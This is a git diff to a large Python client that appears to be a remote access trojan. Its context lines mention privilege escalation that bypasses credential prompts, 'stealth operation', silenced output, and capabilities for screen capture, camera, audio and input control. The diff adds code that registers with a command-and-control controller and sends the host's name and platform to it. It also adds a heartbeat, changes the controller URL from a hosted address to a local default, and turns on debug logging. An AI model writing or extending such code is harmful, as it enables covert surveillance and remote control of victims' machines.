@@ -80,9 +80,16 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = True  # Disable all console output
-DEBUG_MODE = False  # Enable debug logging only when needed
+SILENT_MODE = False  # Enable console output for debugging
+DEBUG_MODE = True  # Enable debug logging for troubleshooting
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
+
+# Fix eventlet issue by patching BEFORE any other imports
+try:
+    import eventlet
+    eventlet.monkey_patch()
+except ImportError:
+    pass  # eventlet not available, continue without it
 
 # Logging system for stealth operation
 import logging
@@ -101,16 +108,28 @@ def setup_silent_logging():
         # Redirect stdout and stderr to null
         sys.stdout = io.StringIO()
         sys.stderr = io.StringIO()
+    else:
+        # Setup normal logging when not in silent mode
+        logging.basicConfig(
+            level=logging.INFO if DEBUG_MODE else logging.WARNING,
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            handlers=[logging.StreamHandler(sys.stdout)]
+        )
 
 def log_message(message, level="info"):
-    """Log message silently without console output"""
-    if not SILENT_MODE and DEBUG_MODE:
-        if level == "error":
-            logging.error(message)
-        elif level == "warning":
-            logging.warning(message)
-        else:
-            logging.info(message)
+    """Log message with proper output handling"""
+    if not SILENT_MODE:
+        # Always print to console when not in silent mode
+        print(f"[{level.upper()}] {message}")
+        
+        # Also log through logging system if debug mode is enabled
+        if DEBUG_MODE:
+            if level == "error":
+                logging.error(message)
+            elif level == "warning":
+                logging.warning(message)
+            else:
+                logging.info(message)
 
 # Initialize silent logging immediately
 setup_silent_logging()
@@ -138,12 +157,7 @@ def safe_import(module_name, feature_description=""):
         handle_missing_dependency(module_name, feature_description)
         return False
 
-# Fix eventlet issue by patching before any other imports
-try:
-    import eventlet
-    eventlet.monkey_patch()
-except ImportError:
-    log_message("eventlet not available", "warning")
+# eventlet already imported and patched at the top of the file
 
 # Standard library imports
 import time
@@ -237,7 +251,11 @@ except ImportError:
 
 # GUI and graphics imports
 try:
-    import pygame
+    import warnings
+    # Suppress pygame pkg_resources deprecation warning
+    with warnings.catch_warnings():
+        warnings.filterwarnings("ignore", category=UserWarning, module="pygame.pkgdata")
+        import pygame
     PYGAME_AVAILABLE = True
 except ImportError:
     PYGAME_AVAILABLE = False
@@ -319,7 +337,7 @@ except ImportError:
     AIORTC_SIGNALING_AVAILABLE = False
     log_message("aiortc.contrib.signaling not available, using custom signaling", "warning")
 
-SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
+SERVER_URL = os.environ.get('CONTROLLER_URL', "http://localhost:8080")  # Use local controller by default (controller.py runs on 8080)
 
 # Global state variables
 STREAMING_ENABLED = False
@@ -5736,6 +5754,13 @@ def register_socketio_handlers():
         log_message("Socket.IO not available, skipping event handler registration", "warning")
         return
     
+    # Register connection handler
+    @sio.event
+    def connect():
+        agent_id = get_or_create_agent_id()
+        log_message(f"Connected to controller, registering agent {agent_id}")
+        sio.emit('agent_connect', {'agent_id': agent_id})
+    
     # Register file transfer handlers
     sio.on('file_chunk_from_operator')(on_file_chunk_from_operator)
     sio.on('file_upload_complete_from_operator')(on_file_upload_complete_from_operator)
@@ -9284,7 +9309,7 @@ def agent_main():
         while True:
             try:
                 connection_attempts += 1
-                log_message(f"Connecting to server (attempt {connection_attempts})...")
+                log_message(f"Connecting to server at {SERVER_URL} (attempt {connection_attempts})...")
                 if sio is None or not SOCKETIO_AVAILABLE:
                     log_message("Socket.IO not available - running in offline mode", "warning")
                     # Continue running in offline mode
@@ -9293,8 +9318,21 @@ def agent_main():
                         time.sleep(60)  # Keep alive in offline mode
                         # Could implement local functionality here
                     return
-                    
-                sio.connect(SERVER_URL)
+                
+                # Add connection timeout and better error handling
+                log_message(f"Attempting to connect to {SERVER_URL}...")
+                
+                # Test if controller is reachable first
+                if REQUESTS_AVAILABLE:
+                    try:
+                        import requests
+                        test_response = requests.get(SERVER_URL, timeout=5)
+                        log_message(f"[OK] Controller is reachable (HTTP {test_response.status_code})")
+                    except Exception as e:
+                        log_message(f"[WARN] Controller may not be running: {e}")
+                        log_message(f"[INFO] Make sure to run: python controller.py")
+                
+                sio.connect(SERVER_URL, wait_timeout=10)
                 log_message("[OK] Connected to server successfully!")
                 
                 # Register Socket.IO event handlers after successful connection
@@ -9303,6 +9341,45 @@ def agent_main():
                     log_message("[OK] Socket.IO event handlers registered successfully")
                 except Exception as handler_error:
                     log_message(f"[WARN] Failed to register Socket.IO handlers: {handler_error}")
+                
+                # Manually register agent with controller
+                try:
+                    log_message(f"[INFO] Registering agent {agent_id} with controller...")
+                    sio.emit('agent_connect', {'agent_id': agent_id})
+                    log_message(f"[OK] Agent {agent_id} registration sent to controller")
+                    
+                    # Send system info to controller
+                    system_info = {
+                        'agent_id': agent_id,
+                        'platform': platform.system(),
+                        'hostname': platform.node(),
+                        'python_version': platform.python_version(),
+                        'capabilities': {
+                            'screen_capture': MSS_AVAILABLE,
+                            'camera': CV2_AVAILABLE,
+                            'audio': PYAUDIO_AVAILABLE,
+                            'input_control': PYNPUT_AVAILABLE,
+                            'webrtc': AIORTC_AVAILABLE
+                        }
+                    }
+                    sio.emit('agent_info', system_info)
+                    log_message(f"[OK] Agent system info sent to controller")
+                    
+                except Exception as reg_error:
+                    log_message(f"[WARN] Failed to register agent: {reg_error}")
+                
+                # Start heartbeat to keep agent visible
+                def heartbeat_worker():
+                    while sio.connected:
+                        try:
+                            sio.emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
+                            time.sleep(30)  # Send heartbeat every 30 seconds
+                        except Exception:
+                            break
+                
+                heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
+                heartbeat_thread.start()
+                log_message("[OK] Heartbeat started")
                 
                 sio.wait()
             except socketio.exceptions.ConnectionError:
@@ -9443,12 +9520,20 @@ if __name__ == "__main__":
         except Exception as e:
             log_message(f"Error disconnecting socket: {e}", "error")
         
-        # Clear sensitive memory
+        # Clear sensitive memory and COM objects
         try:
+            # Clean up COM objects if on Windows
+            if WINDOWS_AVAILABLE:
+                try:
+                    import pythoncom
+                    pythoncom.CoUninitialize()
+                except Exception:
+                    pass  # COM might not be initialized
+            
             import gc
             gc.collect()
         except Exception as e:
-            log_message(f"Error during garbage collection: {e}", "error")
+            log_message(f"Error during cleanup: {e}", "error")
 
 # Agent authentication removed - direct access enabled
 
